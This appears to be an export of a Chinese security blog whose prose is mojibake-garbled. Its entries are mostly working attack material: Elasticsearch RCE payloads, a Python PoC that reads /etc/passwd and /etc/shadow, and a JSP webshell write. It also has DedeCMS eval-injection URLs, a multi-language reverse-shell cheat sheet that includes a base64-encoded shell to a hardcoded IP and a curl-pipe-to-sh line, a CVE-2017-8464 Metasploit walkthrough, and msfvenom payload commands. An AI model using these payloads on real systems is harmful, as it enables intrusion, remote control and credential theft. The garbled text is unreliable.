    <title><![CDATA[Elsaticsearch æ¼æ´å°ç»“]]></title>
    <url>%2F2018%2F07%2F14%2F20%2F</url>
    <content type="text"><![CDATA[0.å› ä¼—æµ‹è¿‡ç¨‹ä¸­é‡åˆ°äº†Elsaticsearchæœªæˆæƒè®¿é—®çš„æƒ…å†µï¼Œæå®Œå‘ç°åˆæŠŠæ—¶é—´æµªè´¹åœ¨äº†æŸ¥å„ç§èµ„æ–™ä¸Šï¼Œæ•…å°è®°ä¸€ç•ªã€‚ 1.æœ1.1 (CVE-2014-3120)elasticsearch v1.1.1 â€“ å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨ï¼š1ã€åˆ›å»ºæ•°æ®ï¼š 1234567posturl: http://ip:9200/foo/foo2postdataï¼š&#123; &quot;name&quot;: &quot;data&quot;&#125; 2ã€æ‰§è¡Œå‘½ä»¤ï¼š 12345678910111213141516171819posturl: http://ip:9200/_search?pretty postdata:&#123; &quot;size&quot;: 1, &quot;query&quot;: &#123; &quot;filtered&quot;: &#123; &quot;query&quot;: &#123; &quot;match_all&quot;: &#123; &#125; &#125; &#125; &#125;, &quot;script_fields&quot;: &#123; &quot;command&quot;: &#123; &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot; &#125; &#125;&#125; å…¶ä»–èµ„æ–™ï¼šï¼ˆ1ï¼‰dockerfileåœ°å€https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120ï¼ˆ2ï¼‰https://www.t00ls.net/viewthread.php?tid=29408ï¼ˆ3ï¼‰http://bouk.co/blog/elasticsearch-rce 1.2 ï¼ˆCVE-2015-1427ï¼‰ElasticSearch Groovy v1.4.2ä»¥ä¸‹ â€“ æ²™ç›’ç»•è¿‡ &amp;&amp; ä»£ç æ‰§è¡Œæ¼æ´åˆ©ç”¨ï¼šJavaæ²™ç›’ç»•è¿‡æ³•ï¼š java.lang.Math.class.forName(â€œjava.lang.Runtimeâ€).getRuntime().exec(â€œidâ€).getText() Goovyç›´æ¥æ‰§è¡Œå‘½ä»¤æ³•ï¼š def command=â€™idâ€™;def res=command.execute().text;res 123posturl: http://ip:9200/_search?pretty postdata:&#123;&quot;size&quot;:1, &quot;script_fields&quot;: &#123;&quot;lupin&quot;:&#123;&quot;lang&quot;:&quot;groovy&quot;,&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;id\&quot;).getText()&quot;&#125;&#125;&#125; å…¶ä»–èµ„æ–™ï¼š(1ï¼‰dockerfileåœ°å€:https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427(2ï¼‰http://cb.drops.wiki/drops/papers-5107.html(3ï¼‰http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427(4ï¼‰https://github.com/XiphosResearch/exploits(5ï¼‰http://cb.drops.wiki/drops/papers-5142.html 1.3ï¼ˆCVE-2015-3337ï¼‰ElasticSearch 1.4.5ä»¥ä¸‹/1.5.2ä»¥ä¸‹ â€“ ç›®å½•ç©¿è¶Šæ¼æ´åˆ©ç”¨ï¼šè¯»æœåŠ¡å™¨ä¸Šæ–‡ä»¶ï¼šburpsuiteçš„repeaterä¸­è®¿é—®urlï¼š 1http://ip:9200/_plugin/head/../../../../../../../../../etc/passwd å…¶ä»–ï¼šï¼ˆ1ï¼‰åŸç†ï¼šåœ¨å®‰è£…äº†å…·æœ‰â€œsiteâ€åŠŸèƒ½çš„æ’ä»¶ä»¥åï¼Œæ’ä»¶ç›®å½•ä½¿ç”¨../å³å¯å‘ä¸Šè·³è½¬ï¼Œå¯¼è‡´ç›®å½•ç©¿è¶Šæ¼æ´ï¼Œå¯è¯»å–ä»»æ„æ–‡ä»¶ã€‚æ²¡æœ‰å®‰è£…ä»»æ„æ’ä»¶çš„elasticsearchä¸å—å½±å“ã€‚ï¼ˆ2ï¼‰dockerfileåœ°å€ï¼šhttps://github.com/vulhub/vulhub/pulse 1.4 ï¼ˆCVE-2015-5531ï¼‰ElasticSearch 1.6.1ä»¥ä¸‹ â€“ ç›®å½•ç©¿è¶Šæ¼æ´è¯´æ˜ï¼šè¯¥æ¼æ´åœ¨elasticsearch 1.5.1åŠä»¥å‰ï¼Œæ— éœ€ä»»ä½•é…ç½®å³å¯è§¦å‘ã€‚ä¹‹åçš„æ–°ç‰ˆï¼Œé…ç½®æ–‡ä»¶elasticsearch.ymlä¸­å¿…é¡»å­˜åœ¨path.repoï¼Œè¯¥é…ç½®å€¼ä¸ºä¸€ä¸ªç›®å½•ï¼Œä¸”è¯¥ç›®å½•å¿…é¡»å¯å†™ï¼Œç­‰äºé™åˆ¶äº†å¤‡ä»½ä»“åº“çš„æ ¹ä½ç½®ã€‚ä¸é…ç½®è¯¥å€¼ï¼Œé»˜è®¤ä¸å¯åŠ¨è¿™ä¸ªåŠŸèƒ½ã€‚ åˆ©ç”¨1ã€åˆ›å»ºä¸€ä¸ªä»“åº“ï¼š 123456789puturl: /_snapshot/testputdata:&#123; &quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123; &quot;location&quot;: &quot;/usr/share/elasticsearch/repo/test&quot; &#125;&#125; 2ã€åˆ›å»ºä¸€ä¸ªå¿«ç…§ï¼š123456789puturl: /_snapshot/test2putdata:&#123; &quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123; &quot;location&quot;: &quot;/usr/share/elasticsearch/repo/test/snapshot-backdata&quot; &#125;&#125; 3ã€ç›®å½•ç©¿è¶Šè®¿é—®æœåŠ¡å™¨æ–‡ä»¶ï¼Œåœ¨burpsuite ä¸­repeaterè®¿é—®ï¼š1http://ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd 4ã€ä»repeaterä¸­å°†é”™è¯¯ä¿¡æ¯è§£ç ï¼Œå³å¯å¾—åˆ°å¯¹åº”æœåŠ¡å™¨æ–‡ä»¶ï¼ˆpasswdï¼‰ä¿¡æ¯ã€‚ å…¶ä»–èµ„æ–™ï¼šï¼ˆ1ï¼‰åŸç†ï¼šelasticsearchä¸­å¤‡ä»½çš„å¿«ç…§ä¿å­˜åœ¨å¤‡ä»½ä»“åº“ä¸­çš„å‘½åæ ¼å¼æ˜¯ä»¥snapshot-xxxçš„æ ¼å¼,æ‰€ä»¥snapshot-backdata ä¼šè¢«è¯¯ä»¥ä¸ºæ˜¯testä»“åº“çš„backdataå¿«ç…§ï¼Œå¿«ç…§éƒ½æ˜¯æ–‡ä»¶å½¢å¼ä¿å­˜çš„ï¼Œè€Œsnapshot-backdataæ˜¯ç›®å½•ï¼Œelasticsearch æ²¡æœ‰åŒºåˆ†ï¼Œå¦‚æœelasticsearchå‘ç°å…¶æ˜¯ç›®å½•ä¹‹åï¼Œå°±ç»§ç»­è¯»å–ç›®å½•ä¸‹çš„å†…å®¹ï¼Œå¦‚æœç›®å½•ä¸‹çš„æ–‡ä»¶æ˜ç§°æ˜¯æ¶æ„æ„é€ çš„(ç±»ä¼¼../../../) elasticsearchå°±ä¼šå»è¯»å–è¿™ä¸ªé€’å½’è¯»å–æ–‡ä»¶çš„å†…å®¹ï¼ˆè¿™é‡Œelasticsearchæ²¡æœ‰è¿‡æ»¤..ï¼‰ï¼Œä»è€Œå¯¼è‡´ç›®å½•éå†ï¼ˆä»»æ„æ–‡ä»¶å†…å®¹è¯»å–ï¼‰ï¼ˆ2ï¼‰dockerfileåœ°å€ï¼šhttps://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-5531ï¼ˆ3ï¼‰python pocï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#!/usr/bin/env python# -*- coding:utf8 -*-&quot;&quot;&quot;PoC for CVE-2015-5531Affects ElasticSearch 1.6.0 and prior&quot;&quot;&quot;import reimport sysimport jsonimport requestsimport urllibimport argparseimport tracebackimport termcolordef colorize_red(string): &quot;&quot;&quot; :param string: :return &quot;&quot;&quot; return termcolor.colored(string, &apos;red&apos;)def colorize_green(string): &quot;&quot;&quot; :param string: :return: &quot;&quot;&quot; return termcolor.colored(string, &apos;green&apos;)def create_repos(base_url): &quot;&quot;&quot; :param base_url: :return: None &quot;&quot;&quot; for index, repo_name in enumerate(REPO_NAME_LST): url = &quot;&#123;0&#125;&#123;1&#125;&quot;.format(base_url, repo_name) req = requests.post(url, json=DATA_REPO_LST[index]) if â€œacknowledgedâ€ in req.json(): print colorize_green(â€œrepository &#123;0&#125;: create successâ€.format(repo_name))def grab_file(vuln_url): â€œâ€&quot; :param xplurl: :return: â€œâ€&quot; req = requests.get(vuln_url) if req.status_code == 400: data = req.json() extrdata = re.findall(râ€™\d+â€™, str(data[&apos;error&apos;])) decoder = bytearray() for i in extrdata[2:]: decoder.append(int(i)) print colorize_green(decoder)def exploit(**args): â€œâ€&quot; :param args: :return: â€œâ€&quot; target = args[&apos;target&apos;] port = args[&apos;port&apos;] fpath = args[&apos;fpath&apos;].split(â€˜,â€™) fpath = [urllib.quote(fp, safe=&apos;&apos;) for fp in fpath] base_url = â€œhttp://&#123;0&#125;:&#123;1&#125;/_snapshot/â€.format(target, port) #create elasticsearch repository for snapshot create_repos(base_url) #grab files for fp in fpath: vuln_url = â€˜&#123;0&#125;&#123;1&#125;/&#123;2&#125;&#123;3&#125;â€™.format(base_url, REPO_NAME_LST[0], FCK, fp) print colorize_red(urllib.unquote(fp)) + â€œ:\nâ€ grab_file(vuln_url)if __name__ == â€œ__main__â€: # for global FCK = â€˜backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..â€™ REPO_NAME_LST = [&apos;test11&apos;, &apos;test12&apos;] DATA_REPO_LST = [&#123;&quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123;&quot;location&quot;: &quot;/tmp/test30&quot;&#125;&#125;, &#123;&quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123;&quot;location&quot;: &quot;/tmp/test30/snapshot-backdata&quot;&#125;&#125;] parser = argparse.ArgumentParser(usage=â€python cve-2015-5531.py optionsâ€, description=â€cve-2015-5531 Vuln PoCâ€, add_help=True) parser.add_argument(â€˜-tâ€™, â€˜â€“targetâ€™, metavar=â€™TARGETâ€™, type=str, dest=â€targetâ€, required=True, help=â€™eg: 127.0.0.1 or www.baidu.comâ€™) parser.add_argument(â€˜-pâ€™, â€˜â€“portâ€™, metavar=â€™PORTâ€™, dest=â€™portâ€™, type=int, default=9200, help=â€™elasticsearch port default 9200â€²) parser.add_argument(â€˜â€“fpathâ€™, metavar=â€™FPATHâ€™, dest=â€™fpathâ€™, type=str, default=â€™/etc/passwd,/etc/shadowâ€™, help=â€™file to grab multi files separated by comma â€˜) args = parser.parse_args() try: exploit(**args.__dict__) except: traceback.print_exc() 1.5ï¼ˆWooYun-2015-110216ï¼‰Elasticsearchï¼ˆ1.5.xä»¥ä¸‹ï¼‰â€“ å†™å…¥webshellæ¼æ´è¯´æ˜ï¼š1ã€åŸç†ï¼šElasticSearchå…·æœ‰å¤‡ä»½æ•°æ®çš„åŠŸèƒ½ï¼Œç”¨æˆ·å¯ä»¥ä¼ å…¥ä¸€ä¸ªè·¯å¾„ï¼Œè®©å…¶å°†æ•°æ®å¤‡ä»½åˆ°è¯¥è·¯å¾„ä¸‹ï¼Œä¸”æ–‡ä»¶åå’Œåç¼€éƒ½å¯æ§ã€‚æ‰€ä»¥ï¼Œå¦‚æœåŒæ–‡ä»¶ç³»ç»Ÿä¸‹è¿˜è·‘ç€å…¶ä»–æœåŠ¡ï¼Œå¦‚Tomcatã€PHPç­‰ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ElasticSearchçš„å¤‡ä»½åŠŸèƒ½å†™å…¥ä¸€ä¸ªwebshellã€‚ 2ã€åˆ©ç”¨æ–¹å¼ï¼šåœ¨è·å–å…¶ä»–webæœåŠ¡çš„æ ¹ç›®å½•åï¼Œç›´æ¥ä½¿ç”¨ESå†™å…¥å¯¹åº”æœ¨é©¬æ–‡ä»¶è‡³è§£æç›®å½•å³å¯ã€‚å¦‚tomcatæœåŠ¡webè§£æç›®å½•ä¸ºï¼š/usr/local/tomcat/webappsã€‚é¦–å…ˆå»ºç«‹ä¸€ä¸ªæ¶æ„ç´¢å¼•æ–‡æ¡£ï¼š123curl -XPOST http://ip:9200/yz.jsp/yz.jsp/1 -d&apos;&#123;&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&#123;47,116,101,115,116,46,106,115,112&#125;)),new String(new byte[]&#123;114,119&#125;)).write(request.getParameter(new String(new byte[]&#123;102&#125;)).getBytes());%&gt;&quot;:&quot;test&quot;&#125;&apos; å†åˆ›å»ºä¸€ä¸ªæ¶æ„çš„å­˜å‚¨åº“ï¼Œå…¶ä¸­locationçš„å€¼å³ä¸ºæˆ‘è¦å†™å…¥çš„è·¯å¾„ã€‚1234567curl -XPUT &apos;http://ip:9200/_snapshot/yz.jsp&apos; -d &apos;&#123; &quot;type&quot;: &quot;fs&quot;, &quot;settings&quot;: &#123; &quot;location&quot;: &quot;/usr/local/tomcat/webapps/wwwroot&quot;, &quot;compress&quot;: false &#125;&#125;&apos; å­˜å‚¨åº“éªŒè¯å¹¶åˆ›å»º:12345curl -XPUT &quot;http://ip:9200/_snapshot/yz.jsp/yz.jsp&quot; -d &apos;&#123; &quot;indices&quot;: &quot;yz.jsp&quot;, &quot;ignore_unavailable&quot;: &quot;true&quot;, &quot;include_global_state&quot;: false&#125;&apos; æœ€åè®¿é—®å†™å…¥çš„webshellå³å¯ï¼š http://ip:9200/wwwroot/indices/yz.jsp/snapshot-yz.jsp ä¸Šé¢çš„jspæ–‡ä»¶ä½œç”¨ä¸ºå‘wwwrootç›®å½•ä¸‹çš„test.jspæ–‡ä»¶å†™å…¥ä»»æ„å­—ç¬¦å¦‚è®¿é—®ä¸‹é¢ï¼š http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=testå°†test.jspä¸­å†™å…¥testã€‚åªéœ€è®¿é—®http://ip:8080/wwwroot/test.jspå³å¯çœ‹åˆ°å…¶é¡µé¢æ˜¾ç¤ºtestã€‚ å…¶ä»–(1) åŸç†åœ°å€ï¼šhttp://cb.drops.wiki/bugs/wooyun-2015-0110216.html(2ï¼‰dockerfileåœ°å€ï¼šhttps://github.com/vulhub/vulhub/tree/master/elasticsearch/WooYun-2015-110216]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>getshell</tag>
        <tag>Elsaticsearch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¿ƒæ‚¸]]></title>
    <url>%2F2018%2F05%2F21%2F%E5%BF%83%E6%82%B8%2F</url>
    <content type="text"><![CDATA[æ­¤æ–‡æ°¸åœ¨å¿ƒä¸­]]></content>
      <categories>
        <category>å²æœˆ</category>
      </categories>
      <tags>
        <tag>ç”Ÿæ´»</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DedeCMS V5.7 SP2åå°æ¼æ´å°é›†åˆ]]></title>
    <url>%2F2018%2F04%2F03%2F19%2F</url>
    <content type="text"><![CDATA[è®°å½•ä¸€ä¸‹æœ€æ–°ç‰ˆdedecmsåå°æ‹¿æœåŠ¡å™¨çš„å‡ ä¸ªæ–¹å¼ã€‚01ã€ä¸Šä¼ shell 1ã€åå°ä¸Šä¼ flashæ–‡ä»¶å¤„æœªå¯¹æ–‡ä»¶å†…å®¹ä½œæ ¡éªŒï¼Œå¯ç›´æ¥ä¸Šä¼ shellã€‚2ã€é€šè¿‡é‡å‘½ååŠŸèƒ½ï¼š 1http://localhost/dede/file_manage_control.php?fmdo=rename&amp;oldfilename=/uploads/media/xxx/xxxx.swf&amp;newfilename=/sunu11.php 02ã€å†™å…¥é…ç½®/dede/sys_verifies.phpä¸­å¯å†™è¿›æ¶æ„ä»£ç è‡³incæ–‡ä»¶ 11ã€http://localhost/dedecms/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_GET[a]);die();// 12ã€http://localhost/dedecms/uploads/dede/sys_verifies.php?action=down&amp;a=phpinfo(); 03ã€æ•°æ®åº“å†™å…¥æ•°æ®æœªè¿‡æ»¤ï¼š 1http://localhost/dedecms/uploads/dede/stepselect_main.php?action=addenum_save&amp;ename=xxx&amp;egroup=;phpinfo();$&amp;issign=1 æŸ¥è¯¢ï¼š 123http://localhost/dedecms/uploads/dede/sys_cache_up.php?step=2&amp;egroup=a=1;phpinfo();&amp;dopost=okor:http://localhost/data/enums/;phpinfo();$.php 05ã€æ¨¡æ¿é—®é¢˜ï¼š1http://localhost/dede/tag_test_action.php?url=a&amp;token=xxxxx&amp;partcode=&#123;dede:mochazz name=&apos;source&apos; runphp=&apos;yes&apos;&#125;phpinfo();&#123;/dede:mochazz&#125;]]></content>
      <categories>
        <category>WEBå®‰å…¨</category>
      </categories>
      <tags>
        <tag>Dedecms</tag>
        <tag>getshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å†…ç½‘æ¸—é€ä¹‹åå¼¹shellçš„å‡ ç§å§¿åŠ¿]]></title>
    <url>%2F2018%2F01%2F26%2F18%2F</url>
    <content type="text"><![CDATA[ä¸»è¦åå¼¹æ–¹å¼ é¦–å…ˆvpsç›‘å¬ï¼šnc â€“l â€“vv â€“p port 1.bashåå¼¹åˆ©ç”¨ç³»ç»Ÿç‰¹æ®Šè®¾å¤‡æ–‡ä»¶/dev/tcpå»ºç«‹socketå‘å‡ºå»ï¼Œè¾¾åˆ°åå¼¹shellçš„æ•ˆæœbash -i&gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 bash -c {echo,IGJhc2ggLWkgPiYgL2Rldi90Y3AvNDUuMzIuMjE5LjI0Mi85MTkxIDAgPiYx==}|{base64,-d}|{bash,-i} 2.telnetåå¼¹é€‚ç”¨äºncä¸å¯ç”¨æˆ–è€…/dev/tcpä¸å¯ç”¨æ¡ä»¶ä¸‹ï¼Œå…¶ä¸­mknodæ˜¯åˆ›å»ºè®¾å¤‡æ–‡ä»¶mknod test p &amp;&amp; telnet ip port 0&lt;test | /bin/bash 1&gt;test telnet ip port | /bin/bash | telnet ip port 3.Java123r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor() 4.Ruby1ruby -rsocket -e&apos;f=TCPSocket.open(&quot;ip&quot;,port).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos; ä¸ä¾èµ–äº/bin/shçš„shellï¼š1ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;ip&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos; 5.PHPphp -r &#39;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; 6.Python(2.7)1python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos; å¦å¤–çš„å½¢å¼ï¼š1python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&apos;ip&apos;,port))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot; 7.Perl1perl -e &apos;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos; ä¸ä¾èµ–äº/bin/shçš„shellï¼š1perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos; 8.nclinuxï¼šnc -e /bin/sh ip portWindowsï¼šnc -e cmd.exe ip portå½“ä¸èƒ½ä½¿ç”¨-eå‚æ•°æ—¶ï¼š123mknod backpipe p &amp;&amp; nc ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe/bin/sh | nc ip portrm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc ip port 0/tmp/ ncç‰ˆæœ¬æœ‰é—®é¢˜æ—¶ï¼šrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f å…¶ä»–æ–¹å¼ï¼š/sbin/busybox nc ip port -e /bin/bash /bin/bash -i &gt; /dev/tcp/ip/prot 0&lt;&amp;1 2&gt;&amp;1 9.lua1lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;ip&apos;,&apos;port&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot; 10.gawk1234567891011121314151617181920#!/usr/bin/gawk -fBEGIN &#123; Port = 8080 Prompt = &quot;bkd&gt; &quot; Service = &quot;/inet/tcp/&quot; Port &quot;/0/0&quot; while (1) &#123; do &#123; printf Prompt |&amp; Service Service |&amp; getline cmd if (cmd) &#123; while ((cmd |&amp; getline) &gt; 0) print $0 |&amp; Service close(cmd) &#125; &#125; while (cmd != &quot;exit&quot;) close(Service) &#125;&#125; 11ã€awk1awk &apos;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.1.128/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&apos; 12ã€å…¶ä»–0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/ip/port;sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196 curl https://x.x.sh/ip:port | sh powershell -nop -c &quot;$client = New-Object Net.Sockets.TCPClient(&#39;1.1.1.1&#39;,6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.UTF8Encoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::UTF8).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot; å‚è€ƒé“¾æ¥ï¼šhttp://www.freebuf.com/articles/system/147768.htmlhttps://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>nc</tag>
        <tag>å†…ç½‘æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LNKæ–‡ä»¶ï¼ˆå¿«æ·æ–¹å¼ï¼‰è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆå¤ç°ï¼‰]]></title>
    <url>%2F2017%2F08%2F29%2F17%2F</url>
    <content type="text"><![CDATA[ä»‹ç»åç§°ï¼šCVE-2017-8464 LNKæ–‡ä»¶ï¼ˆå¿«æ·æ–¹å¼ï¼‰è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ æ¦‚è¦ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡å¯ç§»åŠ¨é©±åŠ¨å™¨ï¼ˆUç›˜ï¼‰æˆ–è¿œç¨‹å…±äº«ç­‰æ–¹å¼å°†åŒ…å«æ¶æ„LNKæ–‡ä»¶å’Œä¸ä¹‹ç›¸å…³çš„æ¶æ„äºŒè¿›åˆ¶æ–‡ä»¶ä¼ æ’­ç»™ç”¨æˆ·ã€‚å½“ç”¨æˆ·é€šè¿‡Windowsèµ„æºç®¡ç†å™¨æˆ–ä»»ä½•èƒ½å¤Ÿè§£æLNKæ–‡ä»¶çš„ç¨‹åºæ‰“å¼€æ¶æ„çš„LNKæ–‡ä»¶æ—¶ï¼Œä¸ä¹‹å…³è”çš„æ¶æ„äºŒè¿›åˆ¶ä»£ç å°†åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œã€‚ å¤ç°ï¼šæ”»å‡»æœºkaliï¼š192.168.86.180 é¶æœºwin10ï¼ˆ64ä½ï¼‰ï¼š192.168.86.177 é¦–å…ˆkaliä¸‹è½½expï¼š12cd /optWget https://raw.githubusercontent.com/ykoster/metasploit-framework/169e00bf3442447324df064192db62cdc5b5b860/modules/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb copy expåˆ°/usr/share/metasploit-framework/modules/exploit/windows/smb/ç›®å½•ä¸‹cp cve_2017_8464_lnk_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/ ç”Ÿæˆç›‘å¬shell 1234msf &gt; use exploit/multi/handler ä½¿ç”¨exploit/multi/handlerç›‘å¬è¿å…¥çš„backdoormsf exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp è®¾ç½®å¯¹åº”çš„payloadmsf exploit(handler) &gt; set LHOST 192.168.86.180msf exploit(handler) &gt; exploit -j ç”Ÿæˆ.LNKæ–‡ä»¶ 1234use exploit/windows/smb/cve_2017_8464_lnk_rcemsf exploit(cve_2017_8464_lnk_rce) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcpmsf exploit(cve_2017_8464_lnk_rce) &gt; set LHOST 192.168.86.180msf exploit(cve_2017_8464_lnk_rce) &gt; exploit å°†ç”Ÿæˆçš„dllæ–‡ä»¶å’Œä»¥Uç›˜ç›˜ç¬¦ç»“å°¾çš„.LNKæ–‡ä»¶å¤åˆ¶åˆ°Uç›˜ä¸­ï¼›å½“æ’å…¥Uç›˜è‡³ä¸»æœºï¼Œåœ¨é¶æœºä¸ŠåŒå‡».LNKæ–‡ä»¶ï¼Œå³å¯è§¦å‘dllæ–‡ä»¶å»ºç«‹è¿æ¥ã€‚ å½±å“ç‰ˆæœ¬ï¼šæ¡Œé¢ç³»ç»Ÿï¼šWindows 10, 7, 8.1, 8, Vistaå’ŒWindows RT 8.1æœåŠ¡å™¨ç³»ç»Ÿï¼šWindows Server 2016ï¼Œ2012ï¼Œ2008 ä¿®å¤ï¼šæ¡Œé¢ç³»ç»ŸWindows 10,7,8.1å’ŒWindows RT 8.1ï¼›æœåŠ¡å™¨ç³»ç»Ÿï¼šWindows Server 2016ï¼Œ2012ï¼Œ2008ï¼Œå¯ä»¥é€šè¿‡Windows Updateè‡ªåŠ¨æ›´æ–°å¾®è½¯è¡¥ä¸çš„æ–¹å¼è¿›è¡Œä¿®å¤ã€‚Windows 8, Vistaå¯ä»¥é€šè¿‡é€‰æ‹©å¯¹åº”ç‰ˆæœ¬ç„¶åæ‰‹åŠ¨æ›´æ–°è¡¥ä¸çš„æ–¹å¼è¿›è¡Œæ›´æ–°ï¼ˆè¡¥ä¸ä¸‹è½½åœ°å€å‚è€ƒï¼‰https://support.microsoft.com/zh-cn/help/4025687/microsoft-security-advisory-4025685-guidance-for-older-platforms]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>CVE-2017-8464</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[msfvenomç”Ÿæˆpayloadçš„æ–¹æ³•]]></title>
    <url>%2F2017%2F08%2F29%2F16%2F</url>
    <content type="text"><![CDATA[äºŒè¿›åˆ¶æ–‡ä»¶Windows msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT= Port -f exe &gt; shell.exe Linux msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= IP LPORT= Port -f elf &gt; shell.elf Mac msfvenom -p osx/x86/shell_reverse_tcp LHOST= IP LPORT= Port -f macho &gt; shell.macho webshellPHP msfvenom -p php/meterpreter_reverse_tcp LHOST= IP LPORT= Port -f raw &gt; shell.php ASP msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=Port -f asp &gt; shell.asp JSP msfvenom -p java/jsp_shell_reverse_tcp LHOST= IP LPORT= Port -f raw &gt; shell.jsp WAR msfvenom -p java/jsp_shell_reverse_tcp LHOST= IP LPORT=Port -f war &gt; shell.war è„šæœ¬shellï¼ˆåå¼¹shellï¼‰Python msfvenom -p cmd/unix/reverse_python LHOST= IP LPORT=Port -f raw &gt; shell.py Bash msfvenom -p cmd/unix/reverse_bash LHOST= IP LPORT=Port -f raw &gt; shell.sh Perl msfvenom -p cmd/unix/reverse_perl LHOST= IP LPORT=Port -f raw &gt; shell.pl é™„ï¼šæŒç»­æ§åˆ¶åœ¨æ”»å‡»æˆåŠŸä¹‹åä¼šåå¼¹å›ä¸€ä¸ªä¼šè¯ï¼Œå½“æœ¨é©¬è¢«åˆ é™¤æˆ–ä¸ç»§ç»­è¿è¡Œæ—¶ï¼Œæˆ‘ä»¬å°±æ— 